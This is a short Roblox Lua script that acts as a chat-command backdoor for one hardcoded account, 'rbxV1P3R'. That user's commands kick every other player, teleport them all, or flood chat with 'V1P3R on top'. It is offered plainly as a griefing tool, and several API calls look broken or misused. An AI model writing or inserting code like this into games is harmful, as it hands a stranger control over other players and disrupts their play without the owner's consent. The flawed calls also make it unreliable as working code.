local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local monitoredPlayer = "rbxV1P3R"
local spamActive = false
local spamCoroutine

game:GetService("Chat").MessagePosted:Connect(function(message, speaker)
    if speaker.Name == monitoredPlayer then
        if message:lower() == ".kick" then
            for _, player in pairs(Players:GetPlayers()) do
                if player.Name ~= monitoredPlayer then
                    player:Kick("VocÃª foi expulso do servidor!")
                end
            end
        elseif message:lower() == ".tpa" then
            for _, player in pairs(Players:GetPlayers()) do
                if player.Name ~= monitoredPlayer then
                    player:MoveTo(speaker.Character.HumanoidRootPart.Position)
                end
            end
        elseif message:lower() == ".spam" then
            if not spamActive then
                spamActive = true
                spamCoroutine = coroutine.create(function()
                    while spamActive do
                        game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("V1P3R on top", "All")
                        wait(1)
                    end
                end)
                coroutine.resume(spamCoroutine)
            end
        elseif message:lower() == ".unspam" then
            if spamActive then
                spamActive = false
                if spamCoroutine then
                    coroutine.close(spamCoroutine)
                end
            end
        end
    end
end)